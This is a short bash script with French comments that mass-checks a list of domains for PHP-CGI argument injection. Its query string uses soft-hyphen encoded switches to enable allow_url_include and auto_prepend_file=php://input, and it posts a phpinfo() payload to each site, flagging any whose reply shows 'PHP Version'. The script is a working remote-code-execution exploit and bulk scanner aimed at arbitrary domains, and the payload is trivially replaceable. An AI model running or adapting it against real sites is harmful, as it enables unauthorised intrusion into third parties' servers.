#!/bin/bash

# Fonction pour vérifier la vulnérabilité d'un domaine
verifier_vulnerabilite() {
    local site=$1
    local reponse=$(curl -s -X POST "${site}/test.hello?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
        -H "User-Agent: curl/8.3.0" \
        -H "Accept: */*" \
        -H "Content-Length: 23" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Connection: keep-alive" \
        --data "<?php phpinfo(); ?>" \
        --max-time 10)

    if [[ $reponse == *"PHP Version"* ]]; then
        echo "$site: Vulnérable"
    fi
}

# Fonction principale pour traiter une liste de domaines
parcourir_domaine() {
    local fichier=$1
    while IFS= read -r ligne || [ -n "$ligne" ]; do
        verifier_vulnerabilite "$ligne"
    done < "$fichier"
}

# Vérifie si un argument de fichier est fourni
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <fichier_liste_domaines>"
    exit 1
fi

# Appel de la fonction principale avec le fichier de la liste des domaines
parcourir_domaine "$1"
